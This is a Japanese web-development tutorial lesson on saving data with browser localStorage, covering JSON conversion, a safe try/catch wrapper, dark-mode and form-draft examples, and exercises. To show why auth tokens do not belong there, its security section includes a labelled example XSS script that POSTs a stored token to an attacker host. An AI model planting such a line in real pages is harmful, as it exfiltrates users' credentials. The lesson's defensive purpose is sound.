# 2-11 localStorage でデータを保存する

> ◎ **このレッスンのゴール**
> - `localStorage` にデータを保存・復元できる
> - JSON の変換を正しく扱える
> - 保存してはいけないデータを判断できる
> - 保存が失敗するケースに備えられる

所要 90分 / 難度 🟡
完成コード: [`code/02-11/`](../code/02-11/)

---

## 📖 リロードで消えてしまう問題

2-6 で学んだ通り、DOM操作の結果は**リロードすると消えます**。

データを残す方法は3つあります。

| 方法 | 保存先 | 消えるタイミング | 容量 | 用途 |
| --- | --- | --- | --- | --- |
| **`localStorage`** | ブラウザ | **明示的に消すまで残る** | 約5MB | 設定、下書き、簡易データ |
| `sessionStorage` | ブラウザ | **タブを閉じると消える** | 約5MB | 一時的な入力保持 |
| サーバー（DB） | サーバー | 消さない限り残る | 無制限 | **本番のデータ**（第3・4部） |

> ⚠️ **`localStorage` は「その人の、そのブラウザ」にしか残りません。**
> - 別の端末では見えない
> - 別のブラウザでも見えない
> - シークレットモードを閉じると消える
> - ユーザーがブラウザのデータを消すと消える
>
> **本番のデータ保存には使えません。** 本命はサーバー（第3部以降）です。

---

## ✍️ 手を動かす① ─ 基本のAPI

```javascript
// 保存
localStorage.setItem("username", "太郎");

// 取得
const name = localStorage.getItem("username");   // "太郎"

// 存在しないキー
const none = localStorage.getItem("nothing");    // null

// 削除
localStorage.removeItem("username");

// 全削除（注意して使う）
localStorage.clear();

// 件数とキー
console.log(localStorage.length);
console.log(localStorage.key(0));
```

### 保存できるのは「文字列」だけ

```javascript
localStorage.setItem("count", 5);
const count = localStorage.getItem("count");
console.log(count, typeof count);   // "5" string ← 文字列になっている

localStorage.setItem("user", { name: "太郎" });
console.log(localStorage.getItem("user"));   // "[object Object]" 😱
```

**オブジェクトや配列は、そのまま保存できません。**

> 🆘 **ここで詰まったら**（取り出した値が `"[object Object]"` や文字列になっている）
> - **原因**：localStorage は**文字列しか保存できません**。保存時に `JSON.stringify(値)`、取り出し時に `JSON.parse(文字列)` を通す必要があります（次で学ぶラッパーがこれを自動化します）
> - **`JSON.parse` でエラーが出る**：保存されている中身が壊れたJSON。`try/catch` で囲み、失敗したら初期値を返す（②のラッパー参照）
> - **保存自体ができない/例外が出る**：プライベートブラウズや容量超過。これも `try/catch` が必須
> - **直らなければ、AIにこう聞く**（保存・取り出しのコードを貼る）：
>   「localStorage から取り出した値が `[object Object]` になります。JSON の変換のどこが抜けているか教えてください」

### JSON で変換する

```javascript
const user = { name: "太郎", age: 20, tags: ["会員", "常連"] };

// 保存：オブジェクト → 文字列
localStorage.setItem("user", JSON.stringify(user));

// 取得：文字列 → オブジェクト
const restored = JSON.parse(localStorage.getItem("user"));
console.log(restored.name);   // 太郎
```

| 関数 | 変換 |
| --- | --- |
| `JSON.stringify(obj)` | オブジェクト → 文字列 |
| `JSON.parse(str)` | 文字列 → オブジェクト |

> ⚠️ **`JSON.parse(null)` は `null` を返しますが、`JSON.parse("")` はエラーになります。**
> データがないケースを必ず考慮してください。

### JSON で失われるもの

```javascript
const data = {
  date: new Date(),        // → 文字列になる
  fn: () => {},            // → 消える
  undef: undefined,        // → 消える
  inf: Infinity,           // → null になる
  nan: NaN,                // → null になる
};

console.log(JSON.parse(JSON.stringify(data)));
// { date: "2026-04-13T...", inf: null, nan: null }
```

> 💡 **日付は文字列になります。** 復元するときは `new Date(str)` で戻してください。
> これを忘れて `date.getFullYear()` を呼び、`is not a function` で悩む人が多いです。

---

## ✍️ 手を動かす② ─ 安全なラッパーを作る

`localStorage` は、**失敗することがあります**。

| 失敗する状況 | 何が起きるか |
| --- | --- |
| シークレットモード（一部ブラウザ） | `setItem` で例外 |
| 容量オーバー（約5MB） | `QuotaExceededError` |
| ブラウザ設定でストレージを無効化 | アクセス自体で例外 |
| 保存されたJSONが壊れている | `JSON.parse` で例外 |

**必ず `try...catch` で包んでください。**

```javascript
// ==========================================================
// localStorage の安全なラッパー
// 📋 コピペして使い回してください
// ==========================================================

const storage = {
  /**
   * 保存する。失敗しても例外を投げない（成否を返す）
   */
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (error) {
      console.error("保存に失敗しました:", error);
      return false;
    }
  },

  /**
   * 取得する。無い・壊れている場合は fallback を返す
   */
  get(key, fallback = null) {
    try {
      const raw = localStorage.getItem(key);
      if (raw === null) return fallback;
      return JSON.parse(raw);
    } catch (error) {
      console.error("読み込みに失敗しました:", error);
      return fallback;
    }
  },

  remove(key) {
    try {
      localStorage.removeItem(key);
      return true;
    } catch {
      return false;
    }
  },

  /** 使える環境かどうか */
  isAvailable() {
    try {
      const testKey = "__storage_test__";
      localStorage.setItem(testKey, "1");
      localStorage.removeItem(testKey);
      return true;
    } catch {
      return false;
    }
  },
};
```

### 使い方

```javascript
// 保存
const ok = storage.set("todos", [{ id: 1, text: "牛乳を買う", done: false }]);
if (!ok) {
  alert("保存できませんでした。ブラウザの設定をご確認ください。");
}

// 取得（無ければ空配列）
const todos = storage.get("todos", []);
console.log(todos);
```

> 💡 **`get` の第2引数（fallback）が重要です。**
> 初回アクセス時は必ず `null` が返るので、`[]` や `{}` を返すようにしておくと、
> 呼び出し側で `null` チェックをしなくて済みます。

---

## ✍️ 手を動かす③ ─ 保存してはいけないもの

```
┌──────────────────────────────────────────────┐
│ ✅ 保存してよい                                │
│  ・UIの設定（ダークモード、表示件数、並び順）  │
│  ・フォームの下書き                            │
│  ・「次回から表示しない」のフラグ              │
│  ・カートの中身（一時的なもの）                │
│  ・学習の進捗など、失っても致命的でないもの     │
├──────────────────────────────────────────────┤
│ ❌ 絶対に保存してはいけない                    │
│  ・パスワード                                  │
│  ・クレジットカード番号                        │
│  ・APIキー・シークレットキー                   │
│  ・個人情報（マイナンバー、住所など）           │
│  ・認証トークン（可能な限り避ける）             │
│  ・失うと困る本番データ                        │
└──────────────────────────────────────────────┘
```

### なぜ危険か

**`localStorage` の中身は、誰でも見られます。**

1. 開発者ツール → Application タブ → Local Storage
2. **JavaScript から自由に読める**（`localStorage.getItem(...)`）

つまり、**XSS 脆弱性が1つでもあれば、全部盗まれます**。

```javascript
// 攻撃者が仕込んだスクリプト（XSSで実行される）
fetch("https://attacker.example/steal", {
  method: "POST",
  body: localStorage.getItem("authToken"),
});
```

> ⚠️ **2-6 で学んだ XSS 対策が、ここで効いてきます。**
> `innerHTML` にユーザー入力を渡さない、が守れていないと、localStorage の中身も危険です。

> 💡 **認証トークンは、本来 `httpOnly` の Cookie に保存します。**
> `httpOnly` Cookie は JavaScript から読めないため、XSS で盗まれません。第5部（Laravel）で扱います。

---

## ✍️ 手を動かす④ ─ 実践1：ダークモードの記憶

```html
<button type="button" id="themeToggle" aria-pressed="false">
  ダークモード
</button>
```

```css
:root {
  --bg: #ffffff;
  --text: #1c1f24;
}

:root[data-theme="dark"] {
  --bg: #16181c;
  --text: #e8e6e1;
}

body {
  background: var(--bg);
  color: var(--text);
  transition: background-color .2s, color .2s;
}
```

```javascript
const THEME_KEY = "theme";
const toggle = document.querySelector("#themeToggle");

/** テーマを適用する */
const applyTheme = (theme) => {
  document.documentElement.setAttribute("data-theme", theme);
  toggle.setAttribute("aria-pressed", String(theme === "dark"));
  toggle.textContent = theme === "dark" ? "ライトモード" : "ダークモード";
};

/** 初期テーマを決める：保存値 → OSの設定 → ライト */
const getInitialTheme = () => {
  const saved = storage.get(THEME_KEY);
  if (saved === "dark" || saved === "light") return saved;

  const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
  return prefersDark ? "dark" : "light";
};

// 初期化
applyTheme(getInitialTheme());

// 切り替え
toggle.addEventListener("click", () => {
  const current = document.documentElement.getAttribute("data-theme");
  const next = current === "dark" ? "light" : "dark";
  applyTheme(next);
  storage.set(THEME_KEY, next);
});
```

> 💡 **「保存値 → OSの設定 → デフォルト」の優先順位**が定番です。
> ユーザーが明示的に選んだ設定を最優先し、選んでいなければOSに従う。

> ⚠️ **ちらつき（FOUC）に注意**
> `<body>` の最後でこのスクリプトを実行すると、**一瞬ライトモードが見えてから暗くなります**。
> 実務では、`<head>` 内で最小限のスクリプトを同期実行して、先に `data-theme` を付けます。

---

## ✍️ 手を動かす⑤ ─ 実践2：フォームの下書き保存

**入力途中でページを閉じても、次回復元される**機能を作ります。

```javascript
const DRAFT_KEY = "contact-draft";
const form = document.querySelector("#reserveForm");

/** 現在の入力内容を保存する */
const saveDraft = () => {
  const data = Object.fromEntries(new FormData(form));
  storage.set(DRAFT_KEY, { data, savedAt: Date.now() });
};

/** 保存済みの下書きを復元する */
const restoreDraft = () => {
  const draft = storage.get(DRAFT_KEY);
  if (!draft) return;

  // 7日以上前の下書きは破棄する
  const WEEK = 7 * 24 * 60 * 60 * 1000;
  if (Date.now() - draft.savedAt > WEEK) {
    storage.remove(DRAFT_KEY);
    return;
  }

  for (const [name, value] of Object.entries(draft.data)) {
    const el = form.elements[name];
    if (!el) continue;
    if (el.type === "checkbox") {
      el.checked = value === "1";
    } else {
      el.value = value;
    }
  }

  showNotice("前回の入力内容を復元しました");
};

// 入力のたびに保存（デバウンスして負荷を下げる）
const debouncedSave = debounce(saveDraft, 500);
form.addEventListener("input", debouncedSave);

// 送信成功したら下書きを消す
form.addEventListener("submit", (e) => {
  e.preventDefault();
  // ... 検証と送信 ...
  storage.remove(DRAFT_KEY);
});

// ページを開いたら復元
restoreDraft();
```

> 💡 **「保存日時も一緒に保存する」**のがポイントです。
> 古い下書きを永遠に持ち続けると、ユーザーが混乱します。

---

## ✍️ 手を動かす⑥ ─ タブ間の同期

同じサイトを2つのタブで開いているとき、**片方の変更をもう片方に伝えられます**。

```javascript
window.addEventListener("storage", (e) => {
  console.log("キー:", e.key);
  console.log("変更前:", e.oldValue);
  console.log("変更後:", e.newValue);

  if (e.key === "todos") {
    todos = JSON.parse(e.newValue ?? "[]");
    render();
  }
});
```

> ⚠️ **`storage` イベントは、「他のタブ」でのみ発火します。** 自分のタブでの変更では発火しません。
> 2つのタブで開いて試してください。

---

## ✍️ 手を動かす⑦ ─ 開発者ツールで確認する

1. `F12` → **Application** タブ（Firefox では「ストレージ」）
2. 左メニュー → **Local Storage** → サイトのURL
3. キーと値が一覧で見られる

**ここでできること**

- 値をダブルクリックして**その場で編集**
- 右クリックで削除
- 「Clear all」で全削除

> 💡 **デバッグ時に非常に便利です。**
> 「壊れたデータが保存されていて、ページが真っ白になる」というときは、ここから削除してください。
>
> Console から `localStorage.clear()` でも消せます。

---

## ⚠️ つまずきポイントまとめ

| 症状 | 原因 | 対処 |
| --- | --- | --- |
| `[object Object]` が保存される | `JSON.stringify()` を忘れた | 必ず変換する |
| `undefined is not valid JSON` | `JSON.parse(null)` ではなく `JSON.parse(undefined)` | 存在チェックを先に |
| 数値が文字列になっている | localStorage は文字列しか保存できない | `Number()` か JSON 経由 |
| `date.getFullYear is not a function` | JSON で日付が文字列になった | `new Date(str)` で復元 |
| シークレットモードで落ちる | `setItem` が例外を投げる | `try...catch` で包む |
| 容量オーバー | 5MB を超えた | 不要なデータを消す、サーバーに移す |
| 別の端末で見えない | localStorage は端末ごと | サーバー保存にする（第3部） |
| 壊れたデータでページが白い | `JSON.parse` で例外 | ラッパーで `try...catch`。Application タブから削除 |

---

## 🤖 AIに聞いてみよう

### ① 保存すべきデータかを相談する

```text
Webアプリで、以下のデータを localStorage に保存しようと考えています。
それぞれについて、保存してよいか判断し、理由を教えてください。

1. ユーザーが選んだテーマ（ダーク/ライト）
2. ログイン中のユーザーのメールアドレス
3. 認証トークン（JWT）
4. ショッピングカートの中身
5. 記事の下書き（本文テキスト）
6. 「チュートリアルを見た」フラグ
7. 直近の検索キーワード履歴

保存すべきでないものについては、代わりにどこに保存すべきかも教えてください。
また、判断の基準を3つにまとめてください。
```

### ② XSS と localStorage の関係を理解する

```text
localStorage に保存したデータが XSS で盗まれる仕組みを、
初学者向けに説明してください。

1. 具体的にどうやって盗まれるのか（仕組みの説明。攻撃コードは不要）
2. httpOnly Cookie ならなぜ安全なのか
3. localStorage を使わざるを得ない場合、リスクを下げる方法はあるか
4. 私が今書いているコードで、XSS の入口になりうる箇所のチェックリスト

攻撃に使えるコードは示さないでください。防御の観点だけでお願いします。
```

---

## 🔧 やってみよう（演習）

**AIに頼らず、自力でやってください。**

### 演習1（必須）

以下の出力を予想してから、Console で実行して確認してください。

```javascript
localStorage.setItem("num", 100);
console.log(localStorage.getItem("num") + 1);
console.log(Number(localStorage.getItem("num")) + 1);

localStorage.setItem("arr", [1, 2, 3]);
console.log(localStorage.getItem("arr"));

localStorage.setItem("obj", JSON.stringify({ d: new Date() }));
const o = JSON.parse(localStorage.getItem("obj"));
console.log(typeof o.d);

console.log(localStorage.getItem("nothing"));
console.log(JSON.parse(localStorage.getItem("nothing")));
```

<details>
<summary>答えを見る</summary>

```
"1001"     ← 文字列 "100" に 1 を連結
101        ← Number() で変換すれば正しい
"1,2,3"    ← 配列は toString() されて "1,2,3" になる（JSONではない）
"string"   ← Date は JSON で文字列になる
null       ← 存在しないキーは null
null       ← JSON.parse(null) は null を返す（エラーにはならない）
```

**3番目に注目**：配列をそのまま保存すると `"1,2,3"` という文字列になります。
`JSON.parse("1,2,3")` はエラーになるので、復元できません。**必ず `JSON.stringify()` を使ってください。**

</details>

### 演習2（必須）

`storage` ラッパーを実装し、以下を確認してください。

- [ ] オブジェクトを保存・復元できる
- [ ] 存在しないキーで fallback が返る
- [ ] Application タブで値をわざと壊す（`{{{` などにする）→ エラーにならず fallback が返る
- [ ] シークレットモードで開いても、ページがクラッシュしない
- [ ] `storage.isAvailable()` が正しく判定する

### 演習3（挑戦）

**「表示設定を記憶するメニュー画面」**を作ってください。

2-6 で作った `dom.html` を拡張します。

- [ ] カテゴリの絞り込み状態を保存する
- [ ] 「売り切れを隠す」の状態を保存する
- [ ] 並び順（価格昇順 / 降順 / デフォルト）を保存する
- [ ] ページを開いたとき、保存された設定を復元して適用する
- [ ] 「設定をリセット」ボタンを付ける
- [ ] 保存に失敗したら、画面に通知を出す（クラッシュさせない）

**発展**
- [ ] 2つのタブで開き、`storage` イベントで同期させる

> 💡 **状態オブジェクト（`filter`）をまるごと1つのキーに保存する**のがコツです。
> 項目ごとにキーを分けると、管理が煩雑になります。
>
> ```javascript
> storage.set("menu-filter", filter);
> filter = storage.get("menu-filter", { category: "all", hideSoldOut: false, sort: "default" });
> ```

---

## ✅ 章末チェック

- [ ] `localStorage` と `sessionStorage` の違いを言える
- [ ] 文字列しか保存できないことと、その対処を知っている
- [ ] `JSON.stringify` / `JSON.parse` を正しく使える
- [ ] JSON で Date が文字列になることを知っている
- [ ] `try...catch` で包む理由を3つ言える
- [ ] 保存してはいけないデータを5つ言える
- [ ] XSS と localStorage の関係を説明できる
- [ ] 開発者ツールの Application タブで中身を見られる
- [ ] 本番のデータ保存には使えない理由を言える

---

**前 → [2-10 非同期処理と fetch でAPIを叩く](02-10-async-fetch.md)　｜　次 → [2-12 AIとペアプロする実践フロー](02-12-ai-pairpro.md)**
